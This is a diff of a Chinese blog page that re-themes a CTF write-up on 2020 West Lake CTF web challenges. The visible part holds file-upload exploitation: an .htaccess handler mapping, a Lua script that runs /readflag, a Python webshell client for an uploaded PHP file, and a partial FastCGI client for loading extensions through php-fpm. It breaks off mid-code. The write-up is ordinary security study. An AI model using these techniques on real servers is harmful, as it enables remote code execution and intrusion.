@@ -1,229 +1,233 @@
+
+
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
 <head>
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.1.1">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="欢迎大家发表自己的见解与评价">
+  <meta name="author" content="slug01sh">
+  <meta name="keywords" content="生活,安全,编程,英语">
+  <title>2020年10月西湖论剑CTF部分web题解 - slug01sh&#39;s blog</title>
 
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta name="description" content="题目质量很高。">
-<meta property="og:type" content="article">
-<meta property="og:title" content="2020年10月西湖论剑CTF部分web题解">
-<meta property="og:url" content="http://example.com/2020/10/14/20201014-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/index.html">
-<meta property="og:site_name" content="slug01sh&#39;s blog">
-<meta property="og:description" content="题目质量很高。">
-<meta property="og:locale">
-<meta property="article:published_time" content="2020-10-14T02:40:10.000Z">
-<meta property="article:modified_time" content="2020-11-08T00:26:53.594Z">
-<meta property="article:author" content="slug01sh">
-<meta property="article:tag" content="生活">
-<meta property="article:tag" content="安全">
-<meta property="article:tag" content="编程">
-<meta property="article:tag" content="英语">
-<meta name="twitter:card" content="summary">
-
-<link rel="canonical" href="http://example.com/2020/10/14/20201014-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : false,
-    isPost : true,
-    lang   : 'zh'
-  };
-</script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
-  <title>2020年10月西湖论剑CTF部分web题解 | slug01sh's blog</title>
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
   
 
 
 
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
 
 
 
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
 
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
+<link  rel="stylesheet" href="/css/main.css" />
 
-</head>
+<!-- 自定义样式保持在最底部 -->
 
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
 
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
   </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">slug01sh's blog</h1>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-      <p class="site-subtitle" itemprop="description">Think with the world</p>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-    </div>
-  </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-首页">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-分类">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-标签">
-
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-归档">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
-
-  </li>
-        <li class="menu-item menu-item-关于">
-
-    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
-
-  </li>
-  </ul>
 </nav>
 
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="2020年10月西湖论剑CTF部分web题解">
+              
+            </span>
 
-
-
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content post posts-expand">
             
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-10-14 10:40" pubdate>
+        2020年10月14日 上午
+      </time>
+    </span>
+  
+</div>
 
+<div class="mt-1">
+  
     
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      26
+       分钟
+    </span>
+  
+
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/14/20201014-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">
+</div>
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="slug01sh">
-      <meta itemprop="description" content="欢迎大家发表自己的见解与评价">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="slug01sh's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          2020年10月西湖论剑CTF部分web题解
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-10-14 10:40:10" itemprop="dateCreated datePublished" datetime="2020-10-14T10:40:10+08:00">2020-10-14</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-11-08 08:26:53" itemprop="dateModified" datetime="2020-11-08T08:26:53+08:00">2020-11-08</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
-                </span>
-            </span>
+            
+          </div>
 
           
-
         </div>
-      </header>
+      </div>
+    </div>
+  </header>
 
+  <main>
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
       
-        <p>题目质量很高。</p>
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2020年10月西湖论剑CTF部分web题解</h1>
+            
+            <div class="markdown-body">
+              <p>题目质量很高。</p>
 <hr>
 <a id="more"></a>
 
@@ -244,9 +248,9 @@
 <li>写一个 1.lua 进行命令执行即可拿到 flag{3be9f1618515e751892cef4cf16f820e}</li>
 </ul>
 <p><strong>.htaccess 文件</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler lua-script .lua</span><br></pre></td></tr></table></figure>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">AddHandler </span>lua-<span class="hljs-keyword">script </span>.lua<br></code></pre></td></tr></table></figure>
 <p><strong>1.lua</strong></p>
-<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span> <span class="string">&quot;string&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(r)</span></span></span><br><span class="line">    r.content_type = <span class="string">&quot;text/plain&quot;</span></span><br><span class="line">    <span class="keyword">local</span> t = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">&#x27;/readflag&#x27;</span>)</span><br><span class="line">    <span class="keyword">local</span> a = t:<span class="built_in">read</span>(<span class="string">&quot;*all&quot;</span>)</span><br><span class="line">    r:puts(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> r.method == <span class="string">&#x27;GET&#x27;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">pairs</span>( r:parseargs() ) <span class="keyword">do</span></span><br><span class="line">            r:puts( <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%s: %s\n&quot;</span>, k, v) )</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        r:puts(<span class="string">&quot;Unsupported HTTP method &quot;</span> .. r.method)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">require</span> <span class="hljs-string">&quot;string&quot;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle</span><span class="hljs-params">(r)</span></span><br>    r.content_type = <span class="hljs-string">&quot;text/plain&quot;</span><br>    <span class="hljs-keyword">local</span> t = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;/readflag&#x27;</span>)<br>    <span class="hljs-keyword">local</span> a = t:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*all&quot;</span>)<br>    r:puts(a)<br><br><br>    <span class="hljs-keyword">if</span> r.method == <span class="hljs-string">&#x27;GET&#x27;</span> <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>( r:parseargs() ) <span class="hljs-keyword">do</span><br>            r:puts( <span class="hljs-built_in">string</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;%s: %s\n&quot;</span>, k, v) )<br>        <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">else</span><br>        r:puts(<span class="hljs-string">&quot;Unsupported HTTP method &quot;</span> .. r.method)<br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>
 
 
 <p><strong>解法3：利用tmp下的php-fpm socket加载扩展（利用蚁剑插件）</strong></p>
@@ -257,11 +261,11 @@
 <li>访问 s.php 得到 flag。 </li>
 </ul>
 <p><strong>方便执行代码（自己base64）</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://newupload.xhlj.wetolink.com/sandbox/i631kn4rq3skctfkab4d65uhuc/upload/5.php&quot;</span></span><br><span class="line">    resp = session.post(</span><br><span class="line">        url=url,</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;pass&#x27;</span>: input()</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    print(resp.text)</span><br><span class="line">    print(<span class="string">&#x27;------------------------------------&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br><br>session = requests.Session()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    url = <span class="hljs-string">&quot;http://newupload.xhlj.wetolink.com/sandbox/i631kn4rq3skctfkab4d65uhuc/upload/5.php&quot;</span><br>    resp = session.post(<br>        url=url,<br>        data=&#123;<br>            <span class="hljs-string">&#x27;pass&#x27;</span>: input()<br>        &#125;<br>    )<br>    print(resp.text)<br>    print(<span class="hljs-string">&#x27;------------------------------------&#x27;</span>)<br></code></pre></td></tr></table></figure>
 <p><strong>2.php</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Client</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> VERSION_1            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> BEGIN_REQUEST        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> PARAMS               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> STDIN                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> STDOUT               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> STDERR               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> DATA                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES_RESULT    = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_TYPE         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> RESPONDER            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">protected</span> $keepAlive = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">protected</span> $_requests = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">protected</span> $_requestCounter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params">$type, $content, $requestId = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $offset = <span class="number">0</span>;</span><br><span class="line">        $totLen = strlen($content);</span><br><span class="line">        $buf    = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">// Packets can be a maximum of 65535 bytes</span></span><br><span class="line">            $part = substr($content, $offset, <span class="number">0xffff</span> - <span class="number">8</span>);</span><br><span class="line">            $segLen = strlen($part);</span><br><span class="line">            $buf .= chr(<span class="built_in">self</span>::VERSION_1)        <span class="comment">/* version */</span></span><br><span class="line">                . chr($type)                    <span class="comment">/* type */</span></span><br><span class="line">                . chr(($requestId &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="comment">/* requestIdB1 */</span></span><br><span class="line">                . chr($requestId &amp; <span class="number">0xFF</span>)        <span class="comment">/* requestIdB0 */</span></span><br><span class="line">                . chr(($segLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>)    <span class="comment">/* contentLengthB1 */</span></span><br><span class="line">                . chr($segLen &amp; <span class="number">0xFF</span>)           <span class="comment">/* contentLengthB0 */</span></span><br><span class="line">                . chr(<span class="number">0</span>)                        <span class="comment">/* paddingLength */</span></span><br><span class="line">                . chr(<span class="number">0</span>)                        <span class="comment">/* reserved */</span></span><br><span class="line">                . $part;                        <span class="comment">/* content */</span></span><br><span class="line">            $offset += $segLen;</span><br><span class="line">        &#125; <span class="keyword">while</span> ($offset &lt; $totLen);</span><br><span class="line">        <span class="keyword">return</span> $buf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params">$name, $value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $nlen = strlen($name);</span><br><span class="line">        $vlen = strlen($value);</span><br><span class="line">        <span class="keyword">if</span> ($nlen &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB0 */</span></span><br><span class="line">            $nvpair = chr($nlen);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line">            $nvpair = chr(($nlen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr(($nlen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr(($nlen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr($nlen &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($vlen &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB0 */</span></span><br><span class="line">            $nvpair .= chr($vlen);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line">            $nvpair .= chr(($vlen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr(($vlen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr(($vlen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr($vlen &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* nameData &amp; valueData */</span></span><br><span class="line">        <span class="keyword">return</span> $nvpair . $name . $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">readNvpair</span>(<span class="params">$data, $length = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($length === <span class="literal">null</span>) &#123;</span><br><span class="line">            $length = strlen($data);</span><br><span class="line">        &#125;</span><br><span class="line">        $array = <span class="keyword">array</span>();</span><br><span class="line">        $p = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ($p != $length) &#123;</span><br><span class="line">            $nlen = ord($data&#123;$p++&#125;);</span><br><span class="line">            <span class="keyword">if</span> ($nlen &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                $nlen = ($nlen &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $vlen = ord($data&#123;$p++&#125;);</span><br><span class="line">            <span class="keyword">if</span> ($vlen &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                $vlen = ($nlen &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);</span><br><span class="line">            $p += ($nlen + $vlen);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $array;</span><br><span class="line">    